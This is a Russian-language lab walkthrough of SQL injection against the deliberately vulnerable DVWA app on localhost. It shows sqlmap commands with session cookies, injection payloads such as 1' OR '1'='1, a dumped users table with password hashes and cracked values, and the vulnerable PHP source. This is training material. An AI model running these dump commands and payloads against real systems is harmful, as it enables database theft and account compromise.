SQLi - иньекция SQL кода в запрос к базе данных
### LOW

#### Используем **sqlmap**
Это отличный инструмент для сканирования на SQLi

Для начала запустим обычное сканирование, через **Burp Suite** возьмем Cookie, без них мы не зайдем в приложение, Так же их можно посмотреть в режиме разработчика в браузере.

Для начала запустим обычное сканирование, без флагов
```bash
└─$ sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=124&Submit=Submit#" \
> --cookie="language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; PHPSESSID=c5cde9a3998bc99b3f83a17cecb30ca1; security=low"
```


```sh
sqlmap identified the following injection point(s) with a total of 175 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=124' AND (SELECT 3449 FROM (SELECT(SLEEP(5)))WeGm) AND 'Kwuz'='Kwuz&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=124' UNION ALL SELECT CONCAT(0x7176786b71,0x6e576a6e56755a54734561684d6d504b4b75736e5677516a4842584d6456525a5845715a54456270,0x716b627871),NULL-- -&Submit=Submit
---

```
После сканирование мы видим что SQLi есть!

```sh
└─$ sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=124&Submit=Submit#" \
--cookie="language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; PHPSESSID=c5cde9a3998bc99b3f83a17cecb30ca1; security=low" --dbs
```

Используем флаг  **--dbs** для получения информации о базе данных.

```sh
available databases [2]:
[*] dvwa
[*] information_schema
```


```sh
─$ sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=124&Submit=Submit#" \
--cookie="language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; PHPSESSID=c5cde9a3998bc99b3f83a17cecb30ca1; security=low" -D dvwa -T users --dump
```
**--dump** - дамп базы данных

```sh 
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2026-01-21 17:09:26 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-01-21 17:09:26 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-01-21 17:09:26 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-01-21 17:09:26 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-01-21 17:09:26 | 0            |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
```

#### Уязвимый код 
```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // Get input
        $id = $_REQUEST[ 'id' ];

        switch ($_DVWA['SQLI_DB']) {
                case MYSQL:
                        // Check database
                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
                        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

                        // Get results
                        while( $row = mysqli_fetch_assoc( $result ) ) {
                                // Get values
                                $first = $row["first_name"];
                                $last  = $row["last_name"];

                                // Feedback for end user
                                $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                        }

                        mysqli_close($GLOBALS["___mysqli_ston"]);
                        break;
                case SQLITE:
                        global $sqlite_db_connection;

                        #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
                        #$sqlite_db_connection->enableExceptions(true);

                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
                        #print $query;
                        try {
                                $results = $sqlite_db_connection->query($query);
                        } catch (Exception $e) {
                                echo 'Caught exception: ' . $e->getMessage();
                                exit();
                        }

                        if ($results) {
                                while ($row = $results->fetchArray()) {
                                        // Get values
                                        $first = $row["first_name"];
                                        $last  = $row["last_name"];

                                        // Feedback for end user
                                        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                                }
                        } else {
                                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
                        }
                        break;
        } 
}

?>
```

В запросе к БД мы видим что параметр id вставляется прямо в SQL запрос, отсюда и SQLi
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Зная как выглядит код можно понять, что сюда подошла бы и простая SQLi вида 
**`1' OR '1'='1`**
Но в случае с реальным пентестом перебирать все бессмысленно, поэтому для автоматизации был использован **sqlmap**

### MEDIUM

Для начала так же запустим **sqlmap**, но уже с другими cookie, для medium сложности

```sh
└─$ sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/" \
--data="id=3&Submit=Submit" \
--cookie="PHPSESSID=5ff690b111fe3e2e3344784e9f2e0bc1; security=medium" \
--dbs
      
```
Так как в этом случае уязвимый параметр передается в HTTP запросе, а не в url строке, используем флаг **`--data`** . **--dbs** Мы уже знаем

Получаем информацию о БД
```sh
[16:33:17] [INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema
```

```sh


Database: dvwa
Table: guestbook
[3 entries]
+------------+--------+----------------------------------------------------+
| comment_id | name   | comment                                            |
+------------+--------+----------------------------------------------------+
| 1          | test   | This is a test comment.                            |
| 2          | епепеп | епепепепе |
| 3          | ищпвфт | кыакаы                                             |
+------------+--------+----------------------------------------------------+
```

Принцип атаки вообще не поменялся, поменялся только payload. Уязвимый код точно такой же.

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
	// Get input
	$id = $_POST[ 'id' ];

	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

			// Get results
			while( $row = mysqli_fetch_assoc( $result ) ) {
				// Display values
				$first = $row["first_name"];
				$last  = $row["last_name"];

				// Feedback for end user
				$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
			}
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			#print $query;
			try {
				$results = $sqlite_db_connection->query($query);
			} catch (Exception $e) {
				echo 'Caught exception: ' . $e->getMessage();
				exit();
			}

			if ($results) {
				while ($row = $results->fetchArray()) {
					// Get values
					$first = $row["first_name"];
					$last  = $row["last_name"];

					// Feedback for end user
					$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
				}
			} else {
				echo "Error in fetch ".$sqlite_db->lastErrorMsg();
			}
			break;
	}
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```
### HARD

Для начала закинем 1' и посмотрим как отреагирует сайт.
Сайт сломался, изначальная страница не открывается, значит SQLi есть
**`1' OR '1'='1`**
Возвращает:
```
ID: 1' OR '1'='1  
First name: admin  
Surname: admin
```
Теперь попробуем сделать с **sqlmap** c важным флагом
**`--ignore-code=500`** 
Теперь наш запрос будет игнорировать 500 ошибку
```sh
└─$ sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=5ff690b111fe3e2e3344784e9f2e0bc1; security=high" \
--level=5 --risk=3 \
--dbs --ignore-code=500 \
--dump
```

И мы получаем нашу базу данных, их будет даже 2, вот одна из них
```sh
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-01-21 17:09:26 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-01-21 17:09:26 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-01-21 17:09:26 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-01-21 17:09:26 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-01-21 17:09:26 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
```

#### Уязвимый код
```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
	// Get input
	$id = $_SESSION[ 'id' ];

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

			// Get results
			while( $row = mysqli_fetch_assoc( $result ) ) {
				// Get values
				$first = $row["first_name"];
				$last  = $row["last_name"];

				// Feedback for end user
				$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
			}

			((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);		
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			#print $query;
			try {
				$results = $sqlite_db_connection->query($query);
			} catch (Exception $e) {
				echo 'Caught exception: ' . $e->getMessage();
				exit();
			}

			if ($results) {
				while ($row = $results->fetchArray()) {
					// Get values
					$first = $row["first_name"];
					$last  = $row["last_name"];

					// Feedback for end user
					$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
				}
			} else {
				echo "Error in fetch ".$sqlite_db->lastErrorMsg();
			}
			break;
	}
}

?>
```

Несмотря на **LIMIT 1** можно прокинуть SQLi, со стороны разработчика проще уже параметризировать запрос и все.
